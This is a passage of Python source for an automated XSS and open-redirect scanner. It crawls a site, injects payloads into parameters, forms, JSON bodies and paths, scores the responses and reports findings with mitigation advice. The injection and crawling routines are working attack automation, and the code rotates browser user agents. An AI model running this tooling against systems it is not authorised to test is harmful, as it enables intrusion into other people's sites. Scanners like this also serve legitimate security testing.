            
            # Common Checks for all static paths (requires static_analysis_resp to be populated)
            if static_analysis_resp:
                if 'html' in content_type or target_param_type == "PATH":
                    ctx = await AdvancedSmartDetection.analyze_context(norm_response)
                    if ctx.get("confidence", 0) > 0.4:
                        comp["context"] += 10
                        reasons.append("High_Confidence_DOM_Context (+10)")
                        
                    events = static_analysis_resp.get('event_handlers', [])
                    if any(token in e for e in events):
                        comp["event_handler"] += 35
                        reasons.append("Event_Handler_Found (+35)")

            # Latency Check
            delta = resp_latency - base_latency
            if delta > base_latency * 1.5 and delta > 0.5:
                latency_bonus = min(15, int(delta * 8))
                comp["latency"] += latency_bonus
                reasons.append(f"Latency_Anomaly (+{latency_bonus})")

        # Final Score Calculation
        if raw_score == 0:
            raw_score = sum(comp.values())

            context_factor = 1.0
            if 60 <= raw_score < 90 and raw_reflected and comp['context_break'] < 30:
                context_factor = 1.15
                reasons.append("Context_Reflect_Boost (+15%)")
            raw_score = int(raw_score * context_factor)
        
        # --- ACCURACY IMPROVEMENT: JSON FALSE POSITIVE REDUCTION (SMARTER 10X) ---
        is_json_response = re.search(r"application/json|text/json|application/problem\+json", metadata.get("content_type", ""), re.IGNORECASE)
        is_pure_reflection = raw_reflected and comp["context_break"] < 30 and comp["event_handler"] < 10 and max_exec_score == 0

        if is_json_response and is_pure_reflection and not raw_score < 40:
             # Reduce score significantly if it's pure reflection in a JSON context without browser execution.
             raw_score = int(raw_score * 0.1) # Aggressive 90% discount
             reasons.append("JSON_API_FP_Discount (-90% - Smart Triage)")
        # -----------------------------------------------------------------------

        adjusted = AdvancedSmartDetection.reduce_false_positives(min(100, raw_score), payload, raw_reflected)

        # Final Score Triage
        if is_verified_dialog:
             adjusted = 100
        elif adjusted >= 98 and not is_verified_dialog:
            adjusted = 95
        elif adjusted < 98 and max_exec_score >= 98:
            adjusted = max_exec_score

        if adjusted >= 98: severity = "CRITICAL"
        elif adjusted >= 85: severity = "HIGH"
        elif adjusted >= 60: severity = "MEDIUM"
        elif adjusted >= 40: severity = "LOW"
        else: severity = "INFO"

        reasons.append(f"Final Score: {adjusted}")
        return adjusted, f"{severity} | {' | '.join(r for r in reasons if r)}"

# --- RESULT CLASSES (KEPT) ---

class VulnResult:
    def __init__(self, url: str, method: str, param: str, payload: str, score: int,
                 xss_token: Optional[str] = None, verified: bool = False, reason: str = "",
                 resp_time: float = 0.0) -> None:
        self.url = url
        self.method = method
        self.param = param
        self.payload = payload
        self.score = score
        self.xss_token = xss_token
        self.verified = verified
        self.reason = reason
        self.resp_time = resp_time
        self.details: Dict[str, Any] = {}
        self.verification_details = ""
        self.mitigation = "Review sanitization and encoding: Apply context-aware output encoding. For high-severity, consider Content Security Policy (CSP)."
        self.severity = self._determine_severity(score, verified)

    def _determine_severity(self, score: int, verified: bool) -> str:
        if verified or score >= 98:
            return "Critical"
        if score >= 85:
            return "High"
        if score >= 60:
            return "Medium"
        if score >= 40:
            return "Low"
        return "Info"
        
class ORResult:
    def __init__(self, url: str, method: str, param: str, injected_url: str, final_status: int, final_location: str) -> None:
        self.url = url
        self.method = method
        self.param = param
        self.injected_url = injected_url
        self.final_status = final_status
        self.final_location = final_location
        self.severity = "Medium"
        self.reason = f"Redirect (Status {final_status}) to injected URL: {final_location}"
        self.mitigation = "Ensure all redirection targets are whitelisted and relative paths are handled securely."
        self.score = 70
        self.verified = True
        self.xss_token = None
        self.resp_time = 0.0
        
# --- PERFORMANCE/SPEED FIXES (RequestManager) ---

class RequestManager:
    UAS: List[str] = [
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    ]
    
    def __init__(self) -> None:
        self.sessions: Dict[str, aiohttp.ClientSession] = {}
        self.global_sem = asyncio.Semaphore(CF.get("concurrent_requests"))
        self.host_semaphores: Dict[str, asyncio.Semaphore] = {}
        self.host_delay: Dict[str, float] = {}
        self.dynamic_delay_factor = 1.0
        
    def get_session(self, domain: str) -> aiohttp.ClientSession:
        global_key = "GLOBAL"
        if global_key not in self.sessions or self.sessions[global_key].closed:
            # FIX: Set up the connector with the proper concurrency limits
            conn = TCPConnector(limit=CF.get("max_concurrency"), ssl=False, resolver=BuiltinResolver(), limit_per_host=CF.get("host_concurrency_limit"))
            timeout = ClientTimeout(total=CF.get("base_timeout"))
            self.sessions[global_key] = aiohttp.ClientSession(connector=conn, timeout=timeout)
        
        return self.sessions[global_key]

    def get_host_semaphore(self, domain: str) -> asyncio.Semaphore:
        if domain not in self.host_semaphores:
            self.host_semaphores[domain] = asyncio.Semaphore(CF.get("host_concurrency_limit"))
        return self.host_semaphores[domain]

    async def do_request(self, url: str, method: str = "GET", data: Any = None,
                         extra_headers: Optional[Dict[str, str]] = None, cookies: Any = None,
                         follow_redirects: bool = True) -> Tuple[int, Optional[str], Dict[str, str], float]:
        
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        sess = self.get_session("GLOBAL")
        host_sem = self.get_host_semaphore(domain)
        
        delay = self.host_delay.get(domain, 0.0) * self.dynamic_delay_factor
        if delay > 0.005:
            await asyncio.sleep(delay)

        headers = {
            "User-Agent": random.choice(self.UAS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        
        if extra_headers:
            headers.update(extra_headers)
            
        start = time.perf_counter()
        
        try:
            async with self.global_sem, host_sem:
                async with sess.request(method, url, headers=headers, data=data,
                                         cookies=cookies, allow_redirects=follow_redirects) as resp:
                    
                    status = resp.status
                    duration = time.perf_counter() - start
                    response_headers = dict(resp.headers)
                    
                    # Throttling Logic (Kept)
                    if status in (429, 403, 503) and CF.get("adaptive_throttle"):
                        self.host_delay[domain] = min(10.0, self.host_delay.get(domain, 0.0) + 1.0)
                        logger.debug(f"Throttling {domain}: Status {status}, Delay increased to {self.host_delay[domain]:.2f}s")
                    elif status >= 500 and status != 503:
                        self.dynamic_delay_factor = min(5.0, self.dynamic_delay_factor + 0.5)
                    elif self.host_delay.get(domain, 0.0) > 0.1 and status in range(200, 300) and CF.get("adaptive_throttle"):
                        self.host_delay[domain] = max(0.0, self.host_delay[domain] * 0.9)
                        
                    try:
                        text_limit = CF.get("max_response_size")
                        content = await resp.content.read(text_limit + 1)
                        
                        content_type = response_headers.get("Content-Type", "").lower()
                        if any(re.search(pat, content_type) for pat in CF["content_type_patterns"].values()):
                            # FIX: Decode only the portion within the limit
                            text = content[:text_limit].decode('utf-8', errors='replace')
                        else:
                            text = ""

                    except Exception as e:
                        logger.debug(f"Failed to read/decode content for {url}: {e}")
                        text = ""
                        
                    return status, text, response_headers, duration
        except Exception as e:
            duration = time.perf_counter() - start
            if isinstance(e, (asyncio.TimeoutError, aiohttp.ClientConnectorError, aiohttp.ServerTimeoutError, aiohttp.TooManyRedirects)):
                self.host_delay[domain] = min(10.0, self.host_delay.get(domain, 0.0) + 0.5)
            logger.debug(f"Request failed for {url}: {type(e).__name__} after {duration:.2f}s")
            return 0, None, {}, duration
            
    async def close_all(self) -> None:
        global_key = "GLOBAL"
        if global_key in self.sessions and not self.sessions[global_key].closed:
            await self.sessions[global_key].close()
        
    async def __aenter__(self):
        return self
    async def __aexit__(self, exc_type, exc, tb):
        await self.close_all()

# --- UTILITIES (KEPT) ---

async def param_reflection_check(url: str, param: str, marker: str, rm: RequestManager) -> Tuple[bool, Dict[str, Any]]:
    """Checks if a parameter value is reflected in the response."""
    parsed = urlparse(url)
    qs = parse_qsl(parsed.query, keep_blank_values=True)
    
    original_value = next((v for k, v in qs if k == param), "")
    new_value = original_value + marker
    
    new_q_dict = {k: v for k, v in qs}
    new_q_dict[param] = new_value
    
    inj_url = urlunparse(parsed._replace(query=urlencode(sorted(new_q_dict.items()), safe='()<>')))
    
    status, resp, _, _ = await rm.do_request(inj_url, "GET")
    
    if not resp or status in (0, 403, 404):
        return False, {"original_value": original_value, "reflection_type": "none"}
    
    reflected_raw = marker in resp
    reflected_unescaped = unquote(marker) in resp
    reflected_html_decoded = html.unescape(marker) in resp
    
    reflected = reflected_raw or reflected_unescaped or reflected_html_decoded
    reflection_type = "raw" if reflected_raw else ("decoded" if reflected_unescaped or reflected_html_decoded else "none")
    
    return reflected, {"original_value": original_value, "reflection_type": reflection_type}

def inject_in_url_path(url: str, payload: str) -> str:
    """Injects payload into the URL path, correctly handling existing paths."""
    parsed = urlparse(url)
    path_to_use = parsed.path.rstrip('/')
    new_path = f"{path_to_use}/{payload.lstrip('/')}"
    if not parsed.path or parsed.path == '/':
        new_path = f"/{payload.lstrip('/')}"
    return urlunparse(parsed._replace(path=new_path, query="", fragment=""))

def extract_js_endpoints(js_content: str, base_url: str) -> Set[str]:
    """Extracts dynamic endpoints from JavaScript content."""
    endpoints: Set[str] = set()

    for match in RE_JS_ENDPOINT.findall(js_content):
        url_part = match
        if url_part.lower().endswith(STATIC_EXTENSIONS): continue

        full_url = urljoin(base_url, url_part)
        
        if is_same_scope(base_url, full_url) and validators.url(full_url):
            clean_url = normalize_url(full_url) if urlparse(full_url).query or urlparse(full_url).fragment else full_url
            endpoints.add(clean_url)

    for match in RE_JS_SINK_CALL.findall(js_content):
        _, url_part = match
        if url_part.startswith(('http', '/', './', '../')) and not url_part.lower().endswith(STATIC_EXTENSIONS):
            full_url = urljoin(base_url, url_part)
            if is_same_scope(base_url, full_url) and validators.url(full_url):
                clean_url = normalize_url(full_url) if urlparse(full_url).query or urlparse(full_url).fragment else full_url
                endpoints.add(clean_url)

    return endpoints

# --- CRAWLER (FIXED) ---

class Crawler:
    """High-concurrency, asynchronous crawler for discovery."""
    def __init__(self, rm: RequestManager, max_depth: int):
        self.rm = rm
        self.max_depth = max_depth
        self.visited_normalized: Set[str] = set()
        self.targets_to_scan: Set[str] = set()
        self.js_files: Set[str] = set()
        self.crawl_queue: asyncio.Queue[Tuple[str, int]] = asyncio.Queue()
        self.targets_lock = asyncio.Lock()
        self.base_host_url: str = ""

    async def _worker(self, progress: Progress, task_id: int):
        while True:
            url = ""
            try:
                # FIX: Use a long timeout for the queue get operation to allow graceful shutdown
                url, depth = await asyncio.wait_for(self.crawl_queue.get(), timeout=10.0) 
            except asyncio.TimeoutError:
                # Check for queue size/completion if timeout occurs
                if self.crawl_queue.empty():
                    break # Break if empty after a timeout
                continue # Go back to the loop and check again
            except asyncio.CancelledError:
                break # Exit the worker cleanly

            normalized_path = normalize_url(url, ignore_query=True)
            
            async with self.targets_lock:
                if normalized_path in self.visited_normalized:
                    self.crawl_queue.task_done()
                    progress.update(task_id, advance=1)
                    continue
                self.visited_normalized.add(normalized_path)
                
            try:
                status, content, headers, _ = await self.rm.do_request(url, "GET")

                content_type = headers.get('Content-Type', '').lower()
                
                # Handling for non-HTML/JS content
                if not content or status not in range(200, 300) or ('html' not in content_type and 'javascript' not in content_type):
                    self.crawl_queue.task_done()
                    progress.update(task_id, advance=1)
                    continue
                
                # Store dynamic targets (URL with query/fragment) for the scanner
                norm_full_url = normalize_url(url)
                if is_interesting(url):
                    async with self.targets_lock:
                        if norm_full_url not in self.targets_to_scan:
                            self.targets_to_scan.add(norm_full_url)
                            
                if depth >= self.max_depth:
                    self.crawl_queue.task_done()
                    progress.update(task_id, advance=1)
                    continue

                if 'javascript' in content_type and url.lower().endswith('.js'):
                    self.js_files.add(url)
                
                if 'html' in content_type:
                    local_soup = await asyncio.to_thread(BeautifulSoup, content, BS_PARSER)
                    
                    # --- Link Extraction ---
                    anchors = [a.get('href') for a in local_soup.find_all('a', href=True)]
                    forms = [form.get('action') for form in local_soup.find_all('form', action=True)]
                    scripts_with_src = [s.get('src') for s in local_soup.find_all('script', src=True)]
                    inline_scripts = [s.string for s in local_soup.find_all('script') if s.string]
                    
                    next_depth = depth + 1
                    all_links = filter(None, chain(anchors, forms))
                    
                    for link_raw in all_links:
                        abs_link = urljoin(url, link_raw)
                        
                        if not is_same_scope(self.base_host_url, abs_link) or not validators.url(abs_link):
                            continue
                            
                        norm_link = normalize_url(abs_link)
                        if is_interesting(abs_link):
                            async with self.targets_lock:
                                if norm_link not in self.targets_to_scan:
                                    self.targets_to_scan.add(norm_link)
                                    
                        norm_path_link = normalize_url(abs_link, ignore_query=True)
                        if norm_path_link not in self.visited_normalized:
                            self.crawl_queue.put_nowait((abs_link, next_depth))

                    for js_url_raw in scripts_with_src:
                        js_url = urljoin(url, js_url_raw)
                        if is_same_scope(self.base_host_url, js_url) and js_url.lower().endswith('.js') and js_url not in self.js_files:
                            self.js_files.add(js_url)
                            
                    for script_content in inline_scripts:
                        new_js_endpoints = extract_js_endpoints(script_content, url)
                        async with self.targets_lock:
                            self.targets_to_scan.update({u for u in new_js_endpoints if urlparse(u).query or urlparse(u).fragment})
                            
            except Exception as e:
                logger.error(f"Crawler processing error on {url}: {type(e).__name__} - {e}")
                
            finally:
                self.crawl_queue.task_done()
                progress.update(task_id, advance=1)
            
    async def start_crawling(self, start_url: str, progress: Progress, task_id: int) -> Tuple[Set[str], Set[str]]:
        
        self.base_host_url = start_url
        if is_interesting(start_url):
            self.targets_to_scan.add(normalize_url(start_url))
            
        self.crawl_queue.put_nowait((start_url, 0))
        initial_total_guess = 10 + CF.get("crawl_depth", 5) * 5
        progress.update(task_id, total=initial_total_guess)
        
        num_workers = AdaptiveScheduler.concurrency(CF.get("crawler_concurrency"))
        workers = [asyncio.create_task(self._worker(progress, task_id)) for _ in range(num_workers)]
        
        try:
            # FIX: Increase timeout for join for deep crawls
            await asyncio.wait_for(self.crawl_queue.join(), timeout=CF.get("base_timeout") * 100) 
        except asyncio.TimeoutError:
            logger.warning("Crawler join timed out, search space may be incomplete.")

        # Cancel all workers gracefully
        for worker in workers:
            worker.cancel()
        # Wait for cancellation
        await asyncio.gather(*workers, return_exceptions=True)
        progress.update(task_id, completed=len(self.visited_normalized))

        return self.targets_to_scan, self.js_files

# --- SCANNER (REFACTOR & STABILITY) ---

class QuantumScanner:
    # Renamed from XSSScanner for the 10x refactor
    def __init__(self) -> None:
        self.rm = RequestManager()
        self.cache = LRUCache(CF.get("max_cache_size"), CF.get("cache_ttl"))
        self.blacklist: List[str] = CF.get("blacklist_patterns")
        self.plugin_manager = PluginManager()
        self.payload_set: List[Tuple[str, str]] = PayloadManager.generate_all_payload_tuples()
        self.results_lock = asyncio.Lock()
        self.deduplicated_findings: Dict[Tuple[str, str, str], Union["VulnResult", "ORResult"]] = {}
        self.browser_sem = asyncio.Semaphore(CF.get("browser_concurrency"))
        self.JSON_HEURISTIC_FIELDS = ["email", "id", "query", "value", "name", "content", "subscribe", "q", "comment", "message", "subject", "api_key"]
        self.REDIRECT_PARAM_KEYWORDS = [r"redirect", r"url", r"target", r"continue", r"next", r"destination", r"returnto"]
        self.REDIRECT_TEST_URL = "https://www.metaxscan.io/proof"

    def get_cache(self, url: str) -> Optional[Tuple[str, Dict[str, Any], float]]:
        return self.cache.get(normalize_url(url, ignore_query=True))

    def set_cache(self, url: str, baseline: str, metadata: Dict[str, Any], avg_latency: float) -> None:
        self.cache.set(normalize_url(url, ignore_query=True), baseline, metadata, avg_latency)

    async def get_baseline(self, url: str) -> Tuple[str, Dict[str, Any], float]:
        """Fetches and caches the page baseline for differential analysis."""
        
        cache_key = normalize_url(url, ignore_query=True)
        cached = self.cache.get(cache_key)
        if cached:
            return cached
            
        total_samples = CF.get("baseline_samples") + CF.get("baseline_retries")
        tasks = [self.rm.do_request(url, "GET") for _ in range(total_samples)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        samples, latencies, headers_list = [], [], []
        for res in responses:
            if isinstance(res, Exception) or res is None: 
                logger.debug(f"Baseline request failed with: {type(res).__name__ if isinstance(res, Exception) else 'None'}")
                continue
            status, resp, headers, latency = res
            if 200 <= status < 400 and resp: 
                samples.append(resp)
                latencies.append(latency)
                headers_list.append(headers)
        
        if not samples:
            return "", {}, 0.0
            
        baseline = max(set(samples), key=samples.count)
        avg_latency = sum(latencies) / len(latencies) if latencies else 0.0
        
        dynamic_content = 0.0
        if CF.get("enable_differential_scoring", True) and len(samples) > 1:
            diff_ratios = [difflib.SequenceMatcher(None, s, baseline).ratio() for s in samples]
            avg_diff = sum(diff_ratios) / len(samples) if samples else 0.0
            dynamic_content = 1.0 - avg_diff
            
        metadata = {
            "content_type": next((ctype for ctype, pat in CF["content_type_patterns"].items()
                                 if headers_list and re.search(pat, headers_list[-1].get("content-type", "").lower())), "html"),
            "dynamic_content": dynamic_content,
            "avg_latency": avg_latency
        }
        
        self.set_cache(url, baseline, metadata, avg_latency)
        return baseline, metadata, avg_latency

    async def detect_reflections(self, url: str) -> Dict[str, Any]:
        """Injects a unique marker into each query parameter to find reflection points."""
        parsed = urlparse(url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        params = list(OrderedDict.fromkeys(k for k, _ in qs))
        
        reflection_tasks = []
        markers: Dict[str, str] = {}
        
        params_to_check = [p for p in params if not any(re.search(pat, p, re.IGNORECASE) for pat in self.blacklist)]
        
        for param in params_to_check:
            marker = f"{CF.get('reflection_check_marker')}{random.randint(10000,99999)}_{param}"
            markers[param] = marker
            reflection_tasks.append(param_reflection_check(url, param, marker, self.rm))
            
        results = await asyncio.gather(*reflection_tasks)
        
        reflected_params = {}
        for idx, param in enumerate(params_to_check):
            result = results[idx]
            if isinstance(result, Tuple) and len(result) == 2:
                reflected, info = result
                if reflected:
                    reflected_params[param] = {"marker": markers[param], "info": info}
            elif isinstance(result, Exception):
                logger.debug(f"Reflection check failed for param {param}: {type(result).__name__} - {result}")
                
        return reflected_params

    async def _inject_and_score(self, target_url: str, method: str, target_param: str, payload: str, token: str, baseline: str, base_latency: float, metadata: Dict[str, Any], data: Any = None, content_type: Optional[str] = None) -> Optional[VulnResult]:
        """Performs a single XSS injection and computes the score."""
        try:
            extra_headers = {}
            if content_type:
                extra_headers['Content-Type'] = content_type
                
            status, resp, _, resp_latency = await self.rm.do_request(target_url, method, data=data, extra_headers=extra_headers)
            
            metadata_with_status = metadata.copy()
            metadata_with_status['http_status'] = status
            metadata_with_status['target_param_type'] = target_param
            
            if not resp:
                return None
                
            score, reason = await ScoreEngine.compute_score(payload, token, baseline, resp, base_latency, resp_latency, metadata_with_status)
            
            if score >= CF.get("score_filter"):
                result = VulnResult(target_url, method, target_param, payload, score, token, False, reason, resp_time=resp_latency)
                
                if method.upper() == "POST" and data:
                    if isinstance(data, dict):
                          result.details['request_data'] = data
                    else:
                          result.details['request_data'] = {'raw_body': data, 'content_type': content_type}
                else:
                    result.details['request_url'] = target_url
                    
                self.plugin_manager.run_plugins(result)
                return result
            return None
        
        except Exception as e:
            logger.error(f"Internal error in _inject_and_score for {target_url} ({target_param}): {type(e).__name__} - {e}")
            return None

    async def _check_for_open_redirect(self, url: str, method: str, param: str, payload_url: str, data: Any = None) -> Optional[ORResult]:
        """Tests a parameter for Open Redirect vulnerability."""
        try:
            test_url = url
            test_data = data
            
            if method == "GET":
                parsed = urlparse(url)
                qs = parse_qsl(parsed.query, keep_blank_values=True)
                new_q = [(k, payload_url if k == param else v) for k, v in qs]
                test_url = urlunparse(parsed._replace(query=urlencode(new_q, safe='()<>')))
                test_data = None
            elif method == "POST":
                if isinstance(data, dict):
                    test_data = data.copy()
                    test_data[param] = payload_url
                elif isinstance(data, str):
                    try:
                        parsed_json = json.loads(data)
                        json_key = param.split('(')[-1].strip(')')
                        if isinstance(parsed_json, dict) and json_key in parsed_json:
                            parsed_json[json_key] = payload_url
                            test_data = json.dumps(parsed_json)
                        else:
                            return None
                    except json.JSONDecodeError:
                        return None
                
            status, _, headers, _ = await self.rm.do_request(test_url, method, data=test_data, follow_redirects=False)
            
            if status in (301, 302, 303, 307, 308):
                location = headers.get('Location', headers.get('location'))
                if location and (location.startswith(payload_url) or urlparse(location).path.strip('/') == urlparse(payload_url).path.strip('/')):
                    return ORResult(url, method, param, payload_url, status, location)
                    
            return None
            
        except Exception as e:
            logger.error(f"Internal error in _check_for_open_redirect for {url} ({param}): {type(e).__name__} - {e}")
            return None

    async def inject_params(self, url: str, baseline: str, base_latency: float, refl: Dict[str, Any], metadata: Dict[str, Any], progress: Progress, task_id: int) -> List[Union[VulnResult, ORResult]]:
        """Tests payloads in reflected query parameters, including OR checks."""
        
        query_work_estimate = len(urlparse(url).query) * 2 * min(len(self.payload_set), CF.get("max_payloads_per_param")) + 1
        
        if not refl:
            progress.update(task_id, advance=query_work_estimate)
            return []
            
        parsed = urlparse(url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        
        payload_limit = CF.get("max_payloads_per_param")
        param_payloads = random.sample(self.payload_set, min(len(self.payload_set), payload_limit))
        
        injection_tasks: List[Awaitable[Optional[Union[VulnResult, ORResult]]]] = []
        
        for param, refl_data in refl.items():
            orig_val = refl_data['info'].get('original_value', '')

            if any(re.search(keyword, param, re.IGNORECASE) for keyword in self.REDIRECT_PARAM_KEYWORDS):
                injection_tasks.append(self._check_for_open_redirect(url, "GET", param, self.REDIRECT_TEST_URL))
            
            for pay, token in param_payloads:
                safe_orig = orig_val if orig_val is not None else ''
                
                # Append Mode
                new_q_append = [(k, (safe_orig + pay) if k == param else v) for k, v in qs]
                inj_url_append = urlunparse(parsed._replace(query=urlencode(new_q_append, safe='()<>')))
                injection_tasks.append(self._inject_and_score(inj_url_append, "GET", param, pay, token, baseline, base_latency, metadata, content_type="application/x-www-form-urlencoded"))

                # Replace Mode
                new_q_replace = [(k, pay if k == param else v) for k, v in qs]
                inj_url_replace = urlunparse(parsed._replace(query=urlencode(new_q_replace, safe='()<>')))
                injection_tasks.append(self._inject_and_score(inj_url_replace, "GET", param, pay, token, baseline, base_latency, metadata, content_type="application/x-www-form-urlencoded"))
                
        results_raw = await asyncio.gather(*injection_tasks, return_exceptions=True)
        
        results = []
        for res in results_raw:
            if isinstance(res, (VulnResult, ORResult)):
                results.append(res)
            elif isinstance(res, Exception):
                logger.error(f"Error in inject_params sub-task: {type(res).__name__} - {res}")

        progress.update(task_id, advance=len(injection_tasks))
        return results
        
    async def inject_forms(self, url: str, baseline: str, base_latency: float, metadata: Dict[str, Any], progress: Progress, task_id: int) -> List[Union[VulnResult, ORResult]]:
        """Parses HTML forms and heuristic inputs, testing for XSS and OR."""
        form_work_estimate = 50
        if 'html' not in metadata.get("content_type", ""):
            progress.update(task_id, advance=form_work_estimate)
            return []
            
        parser = BS_PARSER
        soup = await asyncio.to_thread(BeautifulSoup, baseline, parser)
        forms = soup.find_all("form")
        injection_tasks: List[Awaitable[Optional[Union[VulnResult, ORResult]]]] = []
        
        FORM_INPUT_TAGS = ("input", "textarea", "select")
        form_payloads = random.sample(self.payload_set, min(len(self.payload_set), CF.get("max_payloads_per_param")))
        
        all_form_candidates: List[Dict[str, Any]] = []

        for form in forms:
            action = form.get("action")
            method = (form.get("method") or "GET").upper()
            input_fields = [el for el in form.find_all(FORM_INPUT_TAGS, attrs={'name': True}) if el.get("type") not in ["submit", "reset", "button", "hidden"]]
            if input_fields:
                 all_form_candidates.append({
                     "url": urljoin(url, action or url),
                     "method": method,
                     "fields": input_fields,
                     "content_type": form.get("enctype") or "application/x-www-form-urlencoded"
                 })

        standalone_inputs = [
            el for el in soup.find_all(FORM_INPUT_TAGS, attrs={'name': True})
            if not el.find_parents('form') and re.search(r'email|subscribe|notification|contact', el.get("name", "") + (el.get("id", "")), re.IGNORECASE)
        ]
        
        if standalone_inputs:
            all_form_candidates.append({
                "url": url,
                "method": "POST", 
                "fields": standalone_inputs,
                "content_type": "application/x-www-form-urlencoded"
            })
            
        if not all_form_candidates:
            progress.update(task_id, advance=form_work_estimate)
            return []

        total_injections = 0
        for candidate in all_form_candidates:
            full_url = candidate["url"]
            method = candidate["method"]
            input_fields = candidate["fields"]
            content_type = candidate["content_type"]
            
            base_data_template = {
                el.get("name"): el.get("value") or get_intelligent_default(el.get("name"))
                for el in input_fields if el.get("name")
            }
            
            for target_field in input_fields:
                pn = target_field.get("name")
                if not pn or any(re.search(pat, pn, re.IGNORECASE) for pat in self.blacklist):
                    continue
                    
                # Open Redirect Check
                if any(re.search(keyword, pn, re.IGNORECASE) for keyword in self.REDIRECT_PARAM_KEYWORDS):
                    or_data_replace = base_data_template.copy()
                    or_data_replace[pn] = self.REDIRECT_TEST_URL
                    injection_tasks.append(self._check_for_open_redirect(full_url, method, pn, self.REDIRECT_TEST_URL, data=or_data_replace if method == "POST" else None))


                for pay, token in form_payloads:
                    total_injections += 2
                    
                    # 1. Replace Mode
                    data_replace = base_data_template.copy()
                    data_replace[pn] = pay

                    # 2. Append Mode
                    data_append = base_data_template.copy()
                    default_prefix = base_data_template.get(pn, '')
                    data_append[pn] = default_prefix + pay

                    for data_to_send in [data_replace, data_append]:
                        req_method = method
                        data_payload: Union[Dict[str, str], None] = data_to_send if method != "GET" else None
                        inj_url_final = full_url

                        if method == "GET":
                            inj_url_final = urlunparse(urlparse(full_url)._replace(query=urlencode(data_to_send, safe='()<>')))
                            data_payload = None
                        else:
                            req_method = "POST"
                            
                        injection_tasks.append(self._inject_and_score(inj_url_final, req_method, pn, pay, token, baseline, base_latency, metadata, data=data_payload, content_type=content_type))

        
        results_raw = await asyncio.gather(*injection_tasks, return_exceptions=True)
        
        results = []
        for res in results_raw:
            if isinstance(res, (VulnResult, ORResult)):
                results.append(res)
            elif isinstance(res, Exception):
                logger.error(f"Error in inject_forms task for {url}: {type(res).__name__} - {res}")
            
        progress.update(task_id, advance=total_injections)
        return results

    async def inject_json_body(self, url: str, baseline: str, base_latency: float, metadata: Dict[str, Any], progress: Progress, task_id: int) -> List[Union[VulnResult, ORResult]]:
        """Tests payloads in a JSON body for likely API endpoints."""
        parsed = urlparse(url)
        
        num_payloads = min(len(self.payload_set) + len(PayloadManager.CONTEXT_PAYLOADS.get("json", [])), 30)
        total_work_estimate = len(self.JSON_HEURISTIC_FIELDS) * (1 + 2 * num_payloads)
        
        is_api_endpoint = any(segment in parsed.path.lower() for segment in ["/api/", "/actions/", "/proxy/", "/submit/", "/notifications/", "/v1/", "/v2/", "ajax"])
        is_likely_api = is_api_endpoint or 'json' in metadata.get("content_type", "")
        
        if not is_likely_api:
            progress.update(task_id, advance=total_work_estimate)
            return []

        injection_tasks: List[Awaitable[Optional[Union[VulnResult, ORResult]]]] = []
        json_payloads = random.sample(PayloadManager.CONTEXT_PAYLOADS.get("json", []) + self.payload_set, num_payloads)
        
        for field in self.JSON_HEURISTIC_FIELDS:
            # Open Redirect Check
            if any(re.search(keyword, field, re.IGNORECASE) for keyword in self.REDIRECT_PARAM_KEYWORDS):
                try:
                    or_data_str = json.dumps({field: self.REDIRECT_TEST_URL, "default_key": "default_data"})
                    injection_tasks.append(self._check_for_open_redirect(url, "POST", f"JSON({field})", self.REDIRECT_TEST_URL, data=or_data_str))
                except TypeError:
                    logger.debug(f"Skipping JSON OR check for field {field} due to serialization error.")
            
            # XSS Checks
            for pay, token in json_payloads:
                
                # 1. Direct Field Injection (JSON String)
                try:
                    json_data_str = json.dumps({field: pay, "default_key": "default_data"})
                    injection_tasks.append(self._inject_and_score(
                        url, "POST", f"JSON({field})", pay, token,
                        baseline, base_latency, metadata, data=json_data_str,
                        content_type="application/json"
                    ))
                except TypeError:
                    logger.debug(f"Skipping JSON direct payload {pay} in field {field} due to serialization error.")

                # 2. Array Injection 
                try:
                    json_data_array = json.dumps({field: [pay, "default_data"], "default_key": "default_data"})
                    injection_tasks.append(self._inject_and_score(
                        url, "POST", f"JSON_ARRAY({field})", pay, token,
                        baseline, base_latency, metadata, data=json_data_array,
                        content_type="application/json"
                    ))
                except TypeError:
                    logger.debug(f"Skipping JSON array payload {pay} in field {field} due to serialization error.")
        
        results_raw = await asyncio.gather(*injection_tasks, return_exceptions=True)
        
        results = []
        for res in results_raw:
            if isinstance(res, (VulnResult, ORResult)):
                results.append(res)
            elif isinstance(res, Exception):
                logger.error(f"Error in inject_json_body sub-task: {type(res).__name__} - {res}")
        
        progress.update(task_id, advance=len(injection_tasks))
        return results

    async def inject_path_payloads(self, url: str, baseline: str, base_latency: float, metadata: Dict[str, Any], progress: Progress, task_id: int) -> List[Union[VulnResult, ORResult]]:
        """Tests payloads in the URL path segment."""
        path_work_estimate = 20
        if not CF.get("enable_path_injection", True):
            progress.update(task_id, advance=path_work_estimate)
            return []
            
        injection_tasks: List[Awaitable[Optional[Union[VulnResult, ORResult]]]] = []
        
        path_payloads_only = [(p, t) for p, t in self.payload_set if p in PayloadManager.PATH_PAYLOADS]
        path_payloads_limit = random.sample(path_payloads_only, min(len(path_payloads_only), 10))

        path_reflection_marker = CF.get('reflection_check_marker') + str(random.randint(1000, 9999))
        
        test_url = inject_in_url_path(url, path_reflection_marker)
        status, resp, _, _ = await self.rm.do_request(test_url, "GET")
        is_path_reflected = resp and path_reflection_marker in resp
        
        parsed_url = urlparse(url)
        path_looks_dynamic = parsed_url.path.strip('/') != '' and not parsed_url.path.lower().endswith(STATIC_EXTENSIONS)
        
        if not is_path_reflected and not path_looks_dynamic:
            progress.update(task_id, advance=path_work_estimate)
            return []
            
        for pay, token in path_payloads_limit:
            injected_url = inject_in_url_path(url, pay)
            injection_tasks.append(self._inject_and_score(injected_url, "GET", "PATH", pay, token, baseline, base_latency, metadata))
            
        results_raw = await asyncio.gather(*injection_tasks, return_exceptions=True)
        
        results = []
        for res in results_raw:
            if isinstance(res, (VulnResult, ORResult)):
                results.append(res)
